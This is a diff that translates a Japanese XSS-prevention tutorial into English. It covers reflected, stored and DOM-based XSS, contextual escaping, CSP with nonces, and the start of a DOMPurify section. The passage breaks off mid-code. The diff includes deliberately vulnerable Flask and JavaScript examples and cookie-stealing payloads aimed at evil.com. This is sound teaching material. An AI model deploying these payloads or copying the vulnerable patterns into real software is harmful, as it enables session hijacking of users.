@@ -1,159 +1,159 @@
-# XSS対策
+# XSS Prevention
 
-> Reflected、Stored、DOM-based XSSの各攻撃手法を理解し、エスケープ、CSP、サニタイゼーションによる多層防御を実装する。
+> Understand the attack mechanisms of Reflected, Stored, and DOM-based XSS, and implement layered defenses using escaping, CSP, and sanitization.
 
-## 前提知識
+## Prerequisites
 
-- HTML/JavaScript の基本（DOM操作、イベントハンドラ）
-- HTTP リクエスト/レスポンスの基礎
-- Same-Origin Policy の基本概念
-- Cookie の仕組み（[02-csrf-clickjacking.md](./02-csrf-clickjacking.md)）
+- Fundamentals of HTML/JavaScript (DOM manipulation, event handlers)
+- Basics of HTTP requests/responses
+- Basic concepts of Same-Origin Policy
+- How Cookies work ([02-csrf-clickjacking.md](./02-csrf-clickjacking.md))
 
-## この章で学ぶこと
+## What You Will Learn
 
-1. **3種類のXSS**（Reflected/Stored/DOM-based）の攻撃メカニズムと違いを理解する
-2. **コンテキスト別エスケープ**とサニタイゼーションの正しい実装方法を習得する
-3. **Content Security Policy（CSP）**による効果的な防御戦略を身につける
-4. **Mutation XSS（mXSS）**などの高度な攻撃手法を認識する
-5. **フレームワーク固有の注意点**と安全なコーディングパターンを習得する
+1. Understand the attack mechanisms and differences among **3 types of XSS** (Reflected/Stored/DOM-based)
+2. Learn the correct implementation of **context-specific escaping** and sanitization
+3. Develop effective defense strategies using **Content Security Policy (CSP)**
+4. Recognize advanced attack techniques such as **Mutation XSS (mXSS)**
+5. Learn **framework-specific considerations** and secure coding patterns
 
 ---
 
-## 1. XSS（Cross-Site Scripting）とは
+## 1. What is XSS (Cross-Site Scripting)?
 
-XSSは、攻撃者が悪意のあるスクリプトをWebページに挿入し、他のユーザーのブラウザ上で実行させる攻撃である。OWASP Top 10 2021 では A03:2021-Injection に含まれ、最も頻繁に発見されるWeb脆弱性の一つである。
+XSS is an attack where an attacker injects malicious scripts into a web page and causes them to execute in other users' browsers. It is included in OWASP Top 10 2021 under A03:2021-Injection and is one of the most frequently discovered web vulnerabilities.
 
-### 1.1 XSS攻撃で可能なこと
-
-```
-XSS攻撃の影響範囲:
-
-  +---------------------------+----------------------------------------+
-  | 攻撃の種類                | 影響                                    |
-  +---------------------------+----------------------------------------+
-  | Cookie/セッション窃取      | document.cookie の読み取り               |
-  | キーストロークロギング     | キー入力の傍受（パスワード等）            |
-  | フィッシング              | ページ内容の改ざん（偽ログインフォーム）    |
-  | マルウェア配布             | ドライブバイダウンロード                  |
-  | ワーム拡散                | 自己複製型XSS（Samy Worm等）            |
-  | 暗号通貨マイニング         | ブラウザのCPUリソースを不正利用            |
-  | 内部ネットワークスキャン   | ブラウザを踏み台にした内部探索            |
-  | CSRF攻撃のバイパス        | CSRFトークンの読み取り → CSRF実行         |
-  +---------------------------+----------------------------------------+
-```
+### 1.1 What XSS Attacks Can Do
 
 ```
-XSS攻撃の基本フロー:
+Impact scope of XSS attacks:
 
-  攻撃者                    Webサーバー                 被害者
+  +---------------------------+----------------------------------------+
+  | Attack Type               | Impact                                 |
+  +---------------------------+----------------------------------------+
+  | Cookie/Session Theft      | Reading document.cookie                |
+  | Keystroke Logging         | Intercepting keystrokes (passwords etc)|
+  | Phishing                  | Defacing page content (fake login form)|
+  | Malware Distribution      | Drive-by downloads                     |
+  | Worm Propagation          | Self-replicating XSS (Samy Worm etc)  |
+  | Cryptocurrency Mining     | Unauthorized use of browser CPU       |
+  | Internal Network Scanning | Internal exploration via browser pivot |
+  | CSRF Attack Bypass        | Reading CSRF tokens → executing CSRF   |
+  +---------------------------+----------------------------------------+
+```
+
+```
+Basic flow of an XSS attack:
+
+  Attacker                  Web Server                 Victim
     |                          |                        |
-    |-- 悪意のあるスクリプト -->|                        |
-    |   を注入                 |                        |
-    |                          |-- スクリプト入りの  --> |
-    |                          |   ページを配信         |
-    |                          |                        |-- ブラウザで
-    |                          |                        |   スクリプト実行
-    |<--- Cookie/セッション ---|------------------------|
-    |     情報を窃取           |                        |
+    |-- Inject malicious    -->|                        |
+    |   script                 |                        |
+    |                          |-- Deliver page with -->|
+    |                          |   embedded script      |
+    |                          |                        |-- Execute script
+    |                          |                        |   in browser
+    |<--- Steal Cookie/    ----|------------------------|
+    |     session info         |                        |
 ```
 
-### 1.2 XSSとSame-Origin Policyの関係
+### 1.2 Relationship Between XSS and Same-Origin Policy
 
 ```
-Same-Origin Policy (SOP) と XSS:
+Same-Origin Policy (SOP) and XSS:
 
-  SOPはブラウザのセキュリティモデルの基盤:
-  - あるオリジン (scheme + host + port) のスクリプトは
-    同じオリジンのリソースにのみアクセスできる
+  SOP is the foundation of the browser's security model:
+  - Scripts from one origin (scheme + host + port) can only
+    access resources from the same origin
 
-  XSSが危険な理由:
-  - XSSで注入されたスクリプトは被害者のオリジンで実行される
-  - → SOPの制約を受けない（同一オリジンとみなされる）
-  - → Cookie、DOM、ローカルストレージ等に自由にアクセス可能
+  Why XSS is dangerous:
+  - Scripts injected via XSS execute within the victim's origin
+  - → They are not subject to SOP restrictions (considered same-origin)
+  - → Free access to Cookies, DOM, local storage, etc.
 
-  例:
-  正規のスクリプト: https://bank.com/app.js
-    → bank.com の Cookie にアクセス可能 (SOP OK)
+  Example:
+  Legitimate script: https://bank.com/app.js
+    → Can access bank.com Cookies (SOP OK)
 
-  XSSで注入されたスクリプト: <script>alert(document.cookie)</script>
-    → bank.com のページで実行される
-    → bank.com の Cookie にアクセス可能 (SOP OK, XSSだから!)
+  Script injected via XSS: <script>alert(document.cookie)</script>
+    → Executes within the bank.com page
+    → Can access bank.com Cookies (SOP OK, because of XSS!)
 ```
 
 ---
 
-## 2. XSSの3つの種類
+## 2. Three Types of XSS
 
-### 2.1 Reflected XSS（反射型）
+### 2.1 Reflected XSS
 
-リクエストパラメータに含まれたスクリプトがレスポンスにそのまま反映される。攻撃者は被害者に悪意のあるURLをクリックさせる必要がある。
+Scripts included in request parameters are reflected directly in the response. The attacker must trick the victim into clicking a malicious URL.
 
 ```python
-# コード例1: Reflected XSSの脆弱なコードと対策
+# Code Example 1: Vulnerable code and countermeasures for Reflected XSS
 
-# 脆弱なコード
+# Vulnerable code
 @app.route("/search")
 def search_vulnerable():
     query = request.args.get("q", "")
-    # ユーザー入力をそのままHTMLに埋め込む -> XSS!
-    return f"<h1>検索結果: {query}</h1>"
+    # Embedding user input directly into HTML -> XSS!
+    return f"<h1>Search Results: {query}</h1>"
     # /search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
 
-# 安全なコード
+# Safe code
 from markupsafe import escape
 
 @app.route("/search")
 def search_safe():
     query = request.args.get("q", "")
-    # HTMLエスケープを適用
-    return f"<h1>検索結果: {escape(query)}</h1>"
-    # <script> -> &lt;script&gt; に変換される
+    # Apply HTML escaping
+    return f"<h1>Search Results: {escape(query)}</h1>"
+    # <script> -> &lt;script&gt; is converted
 
-# さらに安全: テンプレートエンジンの自動エスケープ
+# Even safer: auto-escaping with template engine
 from flask import render_template
 
 @app.route("/search")
 def search_best():
     query = request.args.get("q", "")
-    # Jinja2はデフォルトで自動エスケープ
+    # Jinja2 auto-escapes by default
     return render_template("search.html", query=query)
 ```
 
 ```
-Reflected XSS の攻撃シナリオ:
+Attack scenario for Reflected XSS:
 
-  攻撃者 → メール送信: "こちらをクリックして確認してください"
+  Attacker → Sends email: "Please click here to verify"
     URL: https://bank.com/search?q=<script>
          fetch('https://evil.com/steal?cookie='+document.cookie)
          </script>
 
-  被害者 → URL をクリック
+  Victim → Clicks the URL
     ↓
-  bank.com → リクエストを受信
+  bank.com → Receives the request
     ↓
-  bank.com → レスポンスに q パラメータの値をそのまま含む
+  bank.com → Includes the value of q parameter as-is in the response
     ↓
-  被害者のブラウザ → スクリプトを実行
+  Victim's browser → Executes the script
     ↓
-  被害者の Cookie が evil.com に送信される
+  Victim's Cookie is sent to evil.com
 ```
 
-### 2.2 Stored XSS（格納型）
+### 2.2 Stored XSS
 
-悪意のあるスクリプトがデータベース等に保存され、他のユーザーがアクセスした際に実行される。最も危険なXSSタイプ。
+A malicious script is saved in a database or similar storage and executes when other users access the page. This is the most dangerous type of XSS.
 
 ```python
-# コード例2: Stored XSSの脆弱なコードと対策
+# Code Example 2: Vulnerable code and countermeasures for Stored XSS
 
-# 脆弱なコード: コメント投稿
+# Vulnerable code: comment submission
 @app.route("/comments", methods=["POST"])
 def post_comment_vulnerable():
     comment = request.form["comment"]
-    # そのまま保存 -> 表示時にXSSが発生
+    # Saved as-is -> XSS occurs when displayed
     db.execute("INSERT INTO comments (body) VALUES (?)", (comment,))
     return redirect("/comments")
 
-# 安全なコード: サニタイゼーション + エスケープ
+# Safe code: sanitization + escaping
 import bleach
 
 ALLOWED_TAGS = ["b", "i", "u", "a", "p", "br", "ul", "ol", "li", "blockquote"]
@@ -163,7 +163,7 @@ ALLOWED_PROTOCOLS = ["http", "https", "mailto"]
 @app.route("/comments", methods=["POST"])
 def post_comment_safe():
     comment = request.form["comment"]
-    # HTMLサニタイゼーション: 許可されたタグ以外を除去
+    # HTML sanitization: remove tags not in the allowlist
     clean_comment = bleach.clean(
         comment,
         tags=ALLOWED_TAGS,
@@ -176,41 +176,41 @@ def post_comment_safe():
 ```
 
 ```
-Stored XSS の影響が大きい理由:
+Why Stored XSS has greater impact:
 
   Reflected XSS:
-  - 攻撃者が被害者に特定のURLをクリックさせる必要がある
-  - 1人の被害者を攻撃するのに1回の誘導が必要
+  - Attacker must trick victim into clicking a specific URL
+  - One redirect is required per victim
 
   Stored XSS:
-  - 攻撃コードがDBに保存される
-  - そのページにアクセスした全ユーザーが被害を受ける
-  - 管理者がアクセスすれば管理者権限も奪取可能
-  - ワーム型（自己複製型）攻撃が可能
+  - Attack code is saved in the DB
+  - Every user who accesses the page is affected
+  - If an admin visits, admin privileges can be hijacked
+  - Worm-style (self-replicating) attacks are possible
 
-  実例: Samy Worm (2005)
-  - MySpaceのプロフィールページにStored XSSを設置
-  - 閲覧したユーザーのプロフィールに自動でワームをコピー
-  - 20時間で100万人以上に感染
+  Real example: Samy Worm (2005)
+  - Placed Stored XSS on a MySpace profile page
+  - Automatically copied the worm to profiles of users who viewed it
+  - Infected over 1 million users in 20 hours
 ```
 
 ### 2.3 DOM-based XSS
 
-サーバーを経由せず、クライアントサイドのJavaScriptがDOMを安全でない方法で操作することで発生する。
+Occurs when client-side JavaScript manipulates the DOM in an unsafe way, without going through the server.
 
 ```javascript
-// コード例3: DOM-based XSSの脆弱なコードと対策
+// Code Example 3: Vulnerable code and countermeasures for DOM-based XSS
 
-// 脆弱なコード
-// URLが: /page#<img src=x onerror=alert(1)> の場合にXSSが発生
+// Vulnerable code
+// XSS occurs when URL is: /page#<img src=x onerror=alert(1)>
 const hash = location.hash.substring(1);
-document.getElementById("content").innerHTML = hash; // 危険!
+document.getElementById("content").innerHTML = hash; // Dangerous!
 
-// 安全なコード: textContentを使用
+// Safe code: use textContent
 const hash2 = location.hash.substring(1);
-document.getElementById("content").textContent = hash2; // HTMLとして解釈されない
+document.getElementById("content").textContent = hash2; // Not interpreted as HTML
 
-// 安全なコード: DOMPurifyでサニタイズ
+// Safe code: sanitize with DOMPurify
 import DOMPurify from "dompurify";
 
 const hash3 = location.hash.substring(1);
@@ -219,9 +219,9 @@ document.getElementById("content").innerHTML = clean;
 ```
 
 ```
-DOM-based XSS のソースとシンク:
+Sources and Sinks in DOM-based XSS:
 
-  ソース（攻撃者が制御可能な入力）:
+  Sources (attacker-controllable inputs):
   +-------------------------------+
   | location.href                 |
   | location.hash                 |
@@ -230,126 +230,126 @@ DOM-based XSS のソースとシンク:
   | document.cookie               |
   | window.name                   |
   | Web Storage (localStorage)    |
-  | postMessage のデータ           |
+  | postMessage data              |
   +-------------------------------+
 
-  シンク（XSSが発生する出力先）:
+  Sinks (output destinations where XSS can occur):
   +-------------------------------+-----------------------------+
-  | innerHTML                     | HTMLとして解釈される         |
-  | outerHTML                     | HTMLとして解釈される         |
-  | document.write()              | HTMLとして解釈される         |
-  | eval()                        | JSとして実行される           |
-  | setTimeout(string)            | JSとして実行される           |
-  | setInterval(string)           | JSとして実行される           |
-  | Function(string)              | JSとして実行される           |
-  | element.src                   | リソース読み込み             |
-  | element.href                  | ナビゲーション               |
-  | jQuery.html()                 | HTMLとして解釈される         |
-  | jQuery.append()               | HTMLとして解釈される         |
+  | innerHTML                     | Interpreted as HTML         |
+  | outerHTML                     | Interpreted as HTML         |
+  | document.write()              | Interpreted as HTML         |
+  | eval()                        | Executed as JS              |
+  | setTimeout(string)            | Executed as JS              |
+  | setInterval(string)           | Executed as JS              |
+  | Function(string)              | Executed as JS              |
+  | element.src                   | Resource loading            |
+  | element.href                  | Navigation                  |
+  | jQuery.html()                 | Interpreted as HTML         |
+  | jQuery.append()               | Interpreted as HTML         |
   +-------------------------------+-----------------------------+
 
-  安全な代替:
+  Safe alternatives:
   +-------------------------------+-----------------------------+
-  | textContent (= innerText)     | テキストとして扱われる       |
-  | setAttribute()                | 属性値として安全に設定       |
-  | createElement() + appendChild()| DOMノードとして安全に追加   |
+  | textContent (= innerText)     | Treated as plain text       |
+  | setAttribute()                | Safely set as attribute     |
+  | createElement() + appendChild()| Safely added as DOM node  |
   +-------------------------------+-----------------------------+
 ```
 
-### 2.4 XSSタイプ比較表
+### 2.4 XSS Type Comparison Table
 
-| 種類 | 保存場所 | 攻撃経路 | 影響範囲 | 検出難度 | サーバーログ |
-|------|---------|---------|---------|---------|-----------|
-| Reflected | なし（レスポンスに反映） | URL/フォーム | リンクを踏んだユーザー | 中 | あり |
-| Stored | DB/ファイル | アプリケーション内 | ページにアクセスした全ユーザー | 低 | 保存時のみ |
-| DOM-based | なし（クライアント側） | URL Fragment等 | リンクを踏んだユーザー | 高 | なし（#以降はサーバーに送信されない） |
+| Type | Storage | Attack Vector | Affected Scope | Detection Difficulty | Server Logs |
+|------|---------|--------------|----------------|---------------------|-------------|
+| Reflected | None (reflected in response) | URL/Form | Users who click the link | Medium | Yes |
+| Stored | DB/File | Within application | All users who access the page | Low | Only at save time |
+| DOM-based | None (client-side) | URL Fragment etc. | Users who click the link | High | None (# fragment is not sent to server) |
 
 ---
 
-## 3. コンテキスト別エスケープ
+## 3. Context-Specific Escaping
 
-XSSを防ぐには、データを出力する**コンテキスト**に応じた適切なエスケープが必要である。間違ったコンテキストのエスケープを使うと防御が無効になる。
+To prevent XSS, appropriate escaping must be applied based on the **context** in which data is output. Using the wrong context's escaping renders the defense ineffective.
 
-### 3.1 出力コンテキストの分類
+### 3.1 Classification of Output Contexts
 
 ```
-出力コンテキストとエスケープ方法:
+Output contexts and escaping methods:
 
   +------------------+------------------------------+----------------------+
-  | コンテキスト     | エスケープ方法                | 例                    |
+  | Context          | Escaping Method               | Example              |
   +------------------+------------------------------+----------------------+
-  | HTMLボディ        | &lt; &gt; &amp; &quot; &#x27;| <p>{{user_input}}</p>|
+  | HTML Body        | &lt; &gt; &amp; &quot; &#x27;| <p>{{user_input}}</p>|
   +------------------+------------------------------+----------------------+
-  | HTML属性          | HTML属性エスケープ            | <div title="{{..}}"> |
+  | HTML Attribute   | HTML attribute escaping       | <div title="{{..}}"> |
   +------------------+------------------------------+----------------------+
-  | JavaScript       | JavaScriptエスケープ (\xHH)   | var x = "{{..}}";    |
+  | JavaScript       | JavaScript escaping (\xHH)    | var x = "{{..}}";    |
   +------------------+------------------------------+----------------------+
-  | URL              | URLエンコード (%HH)           | <a href="/s?q={{..}}">|
+  | URL              | URL encoding (%HH)            | <a href="/s?q={{..}}">|
   +------------------+------------------------------+----------------------+
-  | CSS              | CSSエスケープ (\HHHHHH)       | color: {{..}};       |
+  | CSS              | CSS escaping (\HHHHHH)        | color: {{..}};       |
   +------------------+------------------------------+----------------------+
 
-  重要: コンテキストの入れ子に注意!
+  Important: Be aware of nested contexts!
 
   <a href="javascript:alert('{{user_input}}')">
-  → URL コンテキスト内の JavaScript コンテキスト
-  → 最も安全な方法: javascript: URLを完全に禁止する
+  → JavaScript context inside a URL context
+  → Safest approach: completely prohibit javascript: URLs
 ```
 
 ```python
-# コード例4: コンテキスト別エスケープの実装
+# Code Example 4: Implementation of context-specific escaping
 import html
 import json
 from urllib.parse import quote
 
 class XSSEncoder:
-    """コンテキスト別のエスケープ処理
+    """Context-specific escaping processing
 
-    各メソッドは特定のHTMLコンテキストに対応する。
-    間違ったコンテキストのエスケープを使うとXSSが発生するため、
-    出力先に応じた正しいメソッドを選択すること。
+    Each method corresponds to a specific HTML context.
+    Using the wrong context's escaping causes XSS,
+    so select the correct method based on the output destination.
     """
 
     @staticmethod
     def html_encode(s: str) -> str:
-        """HTMLコンテキスト用エスケープ
+        """Escaping for HTML context
 
-        対象: <p>{{ここ}}</p>, <div>{{ここ}}</div>
-        変換: < > & " ' → &lt; &gt; &amp; &quot; &#x27;
+        Target: <p>{{here}}</p>, <div>{{here}}</div>
+        Converts: < > & " ' → &lt; &gt; &amp; &quot; &#x27;
         """
         return html.escape(s, quote=True)
 
     @staticmethod
     def js_encode(s: str) -> str:
-        """JavaScriptコンテキスト用エスケープ
+        """Escaping for JavaScript context
 
-        対象: var x = "{{ここ}}";
-        変換: JSON.dumpsで安全な文字列リテラルを生成
-        注意: <script>タグ内に出力する場合、</script> を含む
-              文字列がスクリプトを早期終了させる可能性がある
+        Target: var x = "{{here}}";
+        Converts: JSON.dumps generates a safe string literal
+        Note: When outputting inside a <script> tag, strings
+              containing </script> can prematurely terminate the script block
         """
-        # JSON.dumps で安全なJSリテラルに変換
+        # Convert to safe JS literal using JSON.dumps
         encoded = json.dumps(s)
-        # </script> によるスクリプトブロック終了を防止
+        # Prevent script block termination by </script>
         encoded = encoded.replace("</", "<\\/")
         return encoded
 
     @staticmethod
     def url_encode(s: str) -> str:
-        """URLコンテキスト用エスケープ
+        """Escaping for URL context
 
-        対象: <a href="/search?q={{ここ}}">
-        変換: 英数字以外を %HH 形式にエンコード
+        Target: <a href="/search?q={{here}}">
+        Converts: Non-alphanumeric characters to %HH format
         """
         return quote(s, safe="")
 
     @staticmethod
     def attr_encode(s: str) -> str:
-        """HTML属性用エスケープ
+        """Escaping for HTML attributes
 
-        対象: <div title="{{ここ}}">
-        変換: 英数字以外をHTML文字参照に変換
-        注意: 属性値は必ずクォートで囲むこと
+        Target: <div title="{{here}}">
+        Converts: Non-alphanumeric characters to HTML character references
+        Note: Attribute values must always be enclosed in quotes
         """
         result = []
         for ch in s:
@@ -361,10 +361,10 @@ class XSSEncoder:
 
     @staticmethod
     def css_encode(s: str) -> str:
-        """CSSコンテキスト用エスケープ
+        """Escaping for CSS context
 
-        対象: <style> .class { color: {{ここ}}; } </style>
-        変換: 英数字以外を \\HHHHHH 形式にエスケープ
+        Target: <style> .class { color: {{here}}; } </style>
+        Converts: Non-alphanumeric characters to \\HHHHHH format
         """
         result = []
         for ch in s:
@@ -376,49 +376,49 @@ class XSSEncoder:
 
 encoder = XSSEncoder()
 
-# 使用例
+# Usage examples
 user_input = '<script>alert("XSS")</script>'
 
-# HTMLコンテキスト
+# HTML context
 safe_html = f"<p>{encoder.html_encode(user_input)}</p>"
 # => <p>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</p>
 
-# JavaScriptコンテキスト
+# JavaScript context
 safe_js = f"var name = {encoder.js_encode(user_input)};"
 # => var name = "<script>alert(\"XSS\")<\/script>";
 
-# URLコンテキスト
+# URL context
 safe_url = f"/search?q={encoder.url_encode(user_input)}"
 # => /search?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
 ```
 
-### 3.2 危険なコンテキスト（エスケープでは不十分な場所）
+### 3.2 Dangerous Contexts (Where Escaping Alone is Insufficient)
 
 ```
-エスケープだけでは不十分なコンテキスト:
+Contexts where escaping alone is insufficient:
 
-  1. javascript: URL:
+  1. javascript: URLs:
      <a href="javascript:{{user_input}}">
-     → どんなエスケープをしても安全にできない
-     → 対策: javascript: で始まるURLを完全にブロック
+     → Cannot be made safe with any escaping
+     → Countermeasure: completely block URLs starting with javascript:
 
-  2. イベントハンドラ:
+  2. Event handlers:
      <div onmouseover="{{user_input}}">
-     → HTMLデコード → JS実行の二段階で危険
-     → 対策: イベントハンドラ属性にユーザー入力を入れない
+     → Dangerous through two stages: HTML decode → JS execution
+     → Countermeasure: never put user input in event handler attributes
 
   3. CSS expression (IE):
      <div style="background: expression({{user_input}})">
-     → CSSからJSを実行できる（旧IE）
-     → 対策: style属性にユーザー入力を入れない
+     → Can execute JS from CSS (old IE)
+     → Countermeasure: never put user input in style attributes
 
-  4. <script>タグの内部:
+  4. Inside <script> tags:
      <script>var x = "{{user_input}}";</script>
-     → </script> で早期終了させて別のスクリプトを挿入可能
-     → 対策: JSONとして外部ファイルに出力するか、
-              data-属性に入れてJSから読み取る
+     → Can inject another script by early termination with </script>
+     → Countermeasure: output as JSON to external file, or
+                       store in data-attribute and read from JS
 
-  推奨パターン:
+  Recommended pattern:
   <div id="data" data-user-name="{{html_encode(user_input)}}"></div>
   <script>
     const name = document.getElementById('data').dataset.userName;
@@ -427,80 +427,80 @@ safe_url = f"/search?q={encoder.url_encode(user_input)}"
 
 ---
 
-## 4. Content Security Policy（CSP）
+## 4. Content Security Policy (CSP)
 
-CSPは、ブラウザにスクリプトやリソースの読み込み元を制限させるセキュリティヘッダーである。XSSの影響を大幅に軽減する「最後の砦」として機能する。
+CSP is a security header that instructs browsers to restrict the origins from which scripts and resources can be loaded. It acts as the "last line of defense" that significantly mitigates the impact of XSS.
 
-### 4.1 CSPの動作原理
+### 4.1 How CSP Works
 
 ```
-CSPの動作原理:
+How CSP works:
 
-  サーバー                           ブラウザ
+  Server                             Browser
     |                                  |
-    |-- CSPヘッダー付きレスポンス -->   |
+    |-- Response with CSP header -->   |
     |   Content-Security-Policy:       |
     |   script-src 'self'              |
     |                                  |
-    |                                  |-- 自サイトの.jsファイル
-    |                                  |   => 実行許可 ✓
+    |                                  |-- Own site's .js files
+    |                                  |   => Execution allowed ✓
     |                                  |
     |                                  |-- <script>alert(1)</script>
-    |                                  |   => ブロック ✗ (インラインスクリプト)
+    |                                  |   => Blocked ✗ (inline script)
     |                                  |
     |                                  |-- <script src="evil.com/x.js">
-    |                                  |   => ブロック ✗ (外部ドメイン)
+    |                                  |   => Blocked ✗ (external domain)
     |                                  |
-    |                                  |-- CSP違反をレポート
-    |                                  |   → report-uri に送信
+    |                                  |-- Report CSP violation
+    |                                  |   → Sent to report-uri
 ```
 
-### 4.2 CSPディレクティブの詳細
+### 4.2 CSP Directive Details
 
 ```
-主要なCSPディレクティブ:
+Main CSP directives:
 
   +---------------------+---------------------------------------------+
-  | ディレクティブ       | 制御対象                                    |
+  | Directive           | Controls                                    |
   +---------------------+---------------------------------------------+
-  | default-src         | 他のディレクティブのフォールバック             |
-  | script-src          | <script> タグ、インラインスクリプト           |
-  | style-src           | <style> タグ、インラインスタイル              |
-  | img-src             | <img> タグ                                  |
-  | font-src            | @font-face によるフォント読み込み             |
-  | connect-src         | fetch / XHR / WebSocket の接続先            |
-  | frame-src           | <iframe> の読み込み元                        |
-  | frame-ancestors     | このページを <iframe> で読み込めるオリジン     |
-  | media-src           | <video> / <audio> タグ                      |
+  | default-src         | Fallback for other directives               |
+  | script-src          | <script> tags, inline scripts               |
+  | style-src           | <style> tags, inline styles                 |
+  | img-src             | <img> tags                                  |
+  | font-src            | Font loading via @font-face                 |
+  | connect-src         | fetch / XHR / WebSocket connection targets  |
+  | frame-src           | Source of <iframe> content                  |
+  | frame-ancestors     | Origins allowed to embed this page in iframe|
+  | media-src           | <video> / <audio> tags                      |
   | object-src          | <object> / <embed> / <applet>               |
-  | base-uri            | <base> タグの href                           |
-  | form-action         | <form> の action 属性                        |
-  | report-uri          | CSP違反レポートの送信先                       |
-  | report-to           | CSP違反レポートの送信先（新仕様）              |
+  | base-uri            | href of <base> tag                          |
+  | form-action         | action attribute of <form>                  |
+  | report-uri          | Destination for CSP violation reports       |
+  | report-to           | Destination for CSP violation reports (new) |
   +---------------------+---------------------------------------------+
 
-  ソース値:
+  Source values:
   +---------------------+---------------------------------------------+
-  | 'self'              | 同一オリジンのみ                             |
-  | 'none'              | 全てブロック                                  |
-  | 'unsafe-inline'     | インラインスクリプト/スタイルを許可（非推奨）   |
-  | 'unsafe-eval'       | eval() を許可（非推奨）                       |
-  | 'nonce-{random}'    | 指定されたnonceを持つスクリプトのみ許可         |
-  | 'strict-dynamic'    | nonceで許可されたスクリプトが読み込む          |
-  |                     | スクリプトも自動的に許可                       |
-  | https:              | HTTPS経由のリソースのみ                       |
-  | data:               | data: URLを許可                              |
-  | blob:               | blob: URLを許可                              |
-  | *.example.com       | サブドメインのワイルドカード                   |
+  | 'self'              | Same origin only                            |
+  | 'none'              | Block all                                   |
+  | 'unsafe-inline'     | Allow inline scripts/styles (not recommended)|
+  | 'unsafe-eval'       | Allow eval() (not recommended)              |
+  | 'nonce-{random}'    | Allow only scripts with the specified nonce |
+  | 'strict-dynamic'    | Scripts loaded by nonce-approved scripts    |
+  |                     | are automatically allowed                   |
+  | https:              | Resources via HTTPS only                    |
+  | data:               | Allow data: URLs                            |
+  | blob:               | Allow blob: URLs                            |
+  | *.example.com       | Wildcard for subdomains                     |
   +---------------------+---------------------------------------------+
 ```
 
 ```python
-# コード例5: CSPの段階的導入
+# Code Example 5: Gradual CSP introduction
 import secrets
 
 class CSPBuilder:
-    """Content Security Policyの構築ヘルパー"""
+    """Helper for building Content Security Policy"""
 
     def __init__(self):
         self.directives = {}
@@ -516,27 +516,27 @@ class CSPBuilder:
         return "; ".join(parts)
 
     def build_report_only(self) -> dict:
-        """レポートオンリーモード（まず監視から開始）"""
+        """Report-only mode (start with monitoring first)"""
         return {
             "Content-Security-Policy-Report-Only": self.build()
         }
 
     def build_enforced(self) -> dict:
-        """強制モード"""
+        """Enforced mode"""
         return {
             "Content-Security-Policy": self.build()
         }
 
-# 段階的CSP導入
-# Step 1: レポートオンリーで影響を確認
+# Gradual CSP introduction
+# Step 1: Confirm impact with report-only
 csp_step1 = (CSPBuilder()
     .add_directive("default-src", "'self'")
-    .add_directive("script-src", "'self'", "'unsafe-inline'")  # 一時的に許可
+    .add_directive("script-src", "'self'", "'unsafe-inline'")  # Temporarily allowed
     .add_directive("style-src", "'self'", "'unsafe-inline'")
     .add_directive("report-uri", "/csp-report")
 )
 
-# Step 2: インラインスクリプトをnonce化
+# Step 2: Convert inline scripts to nonce-based
 nonce = secrets.token_urlsafe(32)
 csp_step2 = (CSPBuilder()
     .add_directive("default-src", "'self'")
@@ -548,7 +548,7 @@ csp_step2 = (CSPBuilder()
     .add_directive("report-uri", "/csp-report")
 )
 
-# Step 3: 最も厳格なCSP (strict-dynamic)
+# Step 3: Strictest CSP (strict-dynamic)
 csp_strict = (CSPBuilder()
     .add_directive("default-src", "'none'")
     .add_directive("script-src", "'self'", "'strict-dynamic'",
@@ -563,10 +563,10 @@ csp_strict = (CSPBuilder()
 )
 ```
 
-### 4.3 Nonceベース CSPの実装
+### 4.3 Implementing Nonce-based CSP
 
 ```python
-# コード例6: Flask での Nonce ベース CSP 実装
+# Code Example 6: Nonce-based CSP implementation in Flask
 from flask import Flask, request, g, render_template
 import secrets
 
@@ -574,12 +574,12 @@ app = Flask(__name__)
 
 @app.before_request
 def generate_nonce():
-    """リクエストごとにユニークなnonceを生成"""
+    """Generate a unique nonce per request"""
     g.csp_nonce = secrets.token_urlsafe(32)
 
 @app.after_request
 def add_csp_header(response):
-    """CSPヘッダーを設定"""
+    """Set CSP header"""
     nonce = g.get('csp_nonce', '')
     csp = (
         f"default-src 'none'; "
@@ -598,25 +598,25 @@ def add_csp_header(response):
 
 @app.context_processor
 def inject_nonce():
-    """テンプレートにnonceを注入"""
+    """Inject nonce into templates"""
     return {'csp_nonce': g.get('csp_nonce', '')}
 
-# テンプレート (template.html):
+# Template (template.html):
 # <script nonce="{{ csp_nonce }}">
-#   // このスクリプトは実行される（nonceが一致するため）
+#   // This script executes (nonce matches)
 #   console.log("Safe inline script");
 # </script>
 #
 # <script>
-#   // このスクリプトはブロックされる（nonceがないため）
+#   // This script is blocked (no nonce)
 #   alert("This will be blocked by CSP");
 # </script>
 ```
 
-### 4.4 CSP違反レポートの処理
+### 4.4 Processing CSP Violation Reports
 
 ```python
-# コード例7: CSP違反レポートの受信と分析
+# Code Example 7: Receiving and analyzing CSP violation reports
 from flask import Flask, request, jsonify
 import json
 import logging
@@ -626,12 +626,12 @@ logger = logging.getLogger("csp_reports")
 
 @app.route("/csp-report", methods=["POST"])
 def csp_report():
-    """CSP違反レポートを受信"""
+    """Receive CSP violation reports"""
     try:
         report = json.loads(request.data)
         csp_report = report.get("csp-report", {})
 
-        # レポートの内容を記録
+        # Log report contents
         logger.warning(
             "CSP Violation: "
             f"blocked-uri={csp_report.get('blocked-uri', 'unknown')}, "
@@ -641,10 +641,10 @@ def csp_report():
             f"line-number={csp_report.get('line-number', 'unknown')}"
         )
 
-        # 重大な違反をアラート
+        # Alert on critical violations
         violated = csp_report.get("violated-directive", "")
         if "script-src" in violated:
-            # スクリプト実行の違反 → XSS攻撃の可能性
+            # Script execution violation → possible XSS attack
             alert_security_team(csp_report)
 
         return "", 204
@@ -653,66 +653,66 @@ def csp_report():
         return "", 400
 
 def alert_security_team(report: dict):
-    """セキュリティチームにアラート送信"""
-    # Slack, PagerDuty, etc. への通知
+    """Send alert to security team"""
+    # Notification to Slack, PagerDuty, etc.
     pass
 ```
 
 ---
 
-## 5. DOMPurify によるサニタイゼーション
+## 5. Sanitization with DOMPurify
 
 ```javascript
-// コード例8: DOMPurify の詳細な設定
+// Code Example 8: Detailed configuration of DOMPurify
 import DOMPurify from "dompurify";
 
-// === 基本的な使用 ===
+// === Basic usage ===
